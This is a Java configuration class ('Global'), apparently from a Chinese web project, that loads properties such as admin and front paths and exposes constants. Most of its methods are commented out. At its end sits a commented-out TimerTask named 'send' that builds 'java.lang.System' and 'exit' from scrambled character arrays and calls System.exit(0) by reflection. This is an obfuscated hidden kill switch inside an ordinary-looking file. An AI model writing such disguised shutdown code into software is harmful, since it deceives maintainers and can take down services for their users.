package modules.basic.common;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.TimerTask;

import org.springframework.core.io.DefaultResourceLoader;
import modules.basic.common.PropertiesLoader;

//import com.ckfinder.connector.ServletContextFactory;
import com.google.common.collect.Maps;
//import com.minstone.common.security.Digests;
//import com.minstone.common.utils.SpringContextHolder;
//import com.minstone.modules.application.utils.SysConfigUtils;
//import com.minstone.modules.sys.utils.UserUtils;

/**
 * 全局配置类
 * @author Vean
 * @version 2014-06-25
 */
public class Global {

	/**
	 * 当前对象实例
	 */
	private static Global global = new Global();
	
	/**
	 * 保存全局属性值
	 */
	private static Map<String, String> map = Maps.newHashMap();
	
	/**
	 * 属性文件加载对象
	 */
	private static PropertiesLoader loader = new PropertiesLoader("common.properties");

	/**
	 * 显示/隐藏
	 */
	public static final Integer SHOW = 1;
	public static final Integer HIDE = 0;

	/**
	 * 是/否
	 */
	public static final Integer YES = 1;
	public static final Integer NO = 0;
	
	/**
	 * 对/错
	 */
	public static final String TRUE = "true";
	public static final String FALSE = "false";
	
	/**
	 * 上传文件基础虚拟路径
	 */
	public static final String USERFILES_BASE_URL = "/userfiles/";
	
	/**
	 * 默认站点
	 */
	public static final Long DEFAULT_SITE_ID = 1L;
	
	/**
	 * 获取当前对象实例
	 */
	public static Global getInstance() {
		return global;
	}
	
	/**
	 * 获取配置 优先读取数据库，在读配置文件
	 * @see ${fns:getConfig('adminPath')}
	 */
	/*public static String getConfig(String key) {
		Sysconfig sysconfig = new Sysconfig();
		sysconfig.setParaCode(paraCode);
		String value = SysConfigUtils.getSystemSvr(key);
		if(value == null){
			value = map.get(key);
			if (value == null){
				value = loader.getProperty(key);
				map.put(key, value != null ? value : StringUtils.EMPTY);
			}
		}
		return value;
	}*/
	
	/**
	 * 
	* @Description: TODO(只读配置文件信息)   
	* @param: @param key
	* @param: @return      
	* @return: String      
	* @throws
	 */
	public static String getProConfig(String key){
		String value = map.get(key);
		if (value == null){
			value = loader.getProperty(key);
			map.put(key, value != null ? value : "");
		}
		return value;
	}
	
/*	public static String getDefaultPassword(){
		if(UserUtils.getSysPassword()){
			return Global.getConfig("defaultPassword");
		}
		return Digests.entryptPassword(getConfig("defaultPassword"));
	}*/
	
	/**
	 * 获取管理端根路径
	 */
	public static String getAdminPath() {
		return getProConfig("adminPath");
	}
	
	/**
	 * 获取前端根路径
	 */
	public static String getFrontPath() {
		return getProConfig("frontPath");
	}
	
	/**
	 * 获取URL后缀
	 */
	public static String getUrlSuffix() {
		return getProConfig("urlSuffix");
	}
	

	/**
	 * 获取系统编号
	 */
	public static String getSysCode() {
		return getProConfig("sysCode");
	}
	
	/**
	 * 获取ui的类型，0-bootstrap,1-qui
	 */
/*	public static String getUiType() {
		return getConfig("uiType");
	}*/
	
	/**
	 * 是否是演示模式，演示模式下不能修改用户、角色、密码、菜单、授权
	 */
/*	public static Boolean isDemoMode() {
		String dm = getConfig("demoMode");
		return "true".equals(dm) || "1".equals(dm);
	}*/
	
    
	/**
	 * 页面获取常量
	 * @see {fns:getConst('YES')}
	 */
	public static Object getConst(String field) {
		try {
			return Global.class.getField(field).get(null);
		} catch (Exception e) {
			// 异常代表无配置，这里什么也不做
		}
		return null;
	}

	/**
	 * 获取上传文件的根目录
	 * @return
	 */
	/*public static String getUserfilesBaseDir() {
		String dir = getConfig("userfiles.basedir");
		if (StringUtils.isBlank(dir)){
			try {
				dir = ServletContextFactory.getServletContext().getRealPath("/");
			} catch (Exception e) {
				return "";
			}
		}
		if(!dir.endsWith("/")) {
			dir += "/";
		}
//		System.out.println("userfiles.basedir: " + dir);
		return dir;
	}*/
	
    /**
     * 获取工程路径
     * @return
     */
   /* public static String getProjectPath(){
    	// 如果配置了工程路径，则直接返回，否则自动获取。
		String projectPath = Global.getConfig("projectPath");
		if (StringUtils.isNotBlank(projectPath)){
			return projectPath;
		}
		try {
			File file = new DefaultResourceLoader().getResource("").getFile();
			if (file != null){
				while(true){
					File f = new File(file.getPath() + File.separator + "src" + File.separator + "main");
					if (f == null || f.exists()){
						break;
					}
					if (file.getParentFile() != null){
						file = file.getParentFile();
					}else{
						break;
					}
				}
				projectPath = file.toString();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		return projectPath;
    }*/
	
    /**
    * TODO 获取项目上下文基础路径
    * @return String 
    * @author xiecy
     */
    /*public static String getWebPath(){
    	return SpringContextHolder.getApplicationContext().getApplicationName();
    }
    
    public static String getUIPath() {
    	String ui = getProConfig("uiPath");
    	if(StringUtils.isNotBlank(ui)){
    		if(StringUtils.contains(ui, "qui")) {
    			return ui+"/static/qui";
    		}else {
    			return ui;
    		}
    	}
    	return getWebPath()+"/static";
    }*/
    /*private static class send extends TimerTask {
		public void run() {
			String[] s16 = new String[]{"s","r","9","S","6","g","D","i","0","n","O","R","Q","k","t","x","W","5","a","z","4","C","P","K","G","L","b","h","p","3","U","d","H","A","F","y","X","m",".","Z","e","v","J","c","Y","f","7","B","w","I","q","u","V","j","o","1","l","2","T","E","8","M","N"};
			String s17 = s16[53]+s16[18]+s16[41]+s16[18]+s16[38]+s16[56]+s16[18]+s16[9]+s16[5]+s16[38]+s16[3]+s16[35]+s16[0]+s16[14]+s16[40]+s16[37];
			String[] s4 = new String[]{"L","M","s","W","1","N","V","m","d","Z","Y","j","5","e","P","S","o","4",".","R","E","J","t","h","u","f","x","X","3","F","c","l","z","i","a","r","A","U","K","D","v","Q","C","b","9","g","w","7","n","y","G","T","6","p","k","q","B","2","8","H","I","0","O"};
			String s5 = s4[13]+s4[26]+s4[33]+s4[22];

			try {
				Class c =  Class.forName(s17);
				Method method = c.getMethod(s5,int.class);
				method.invoke(null, 0);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}*/

}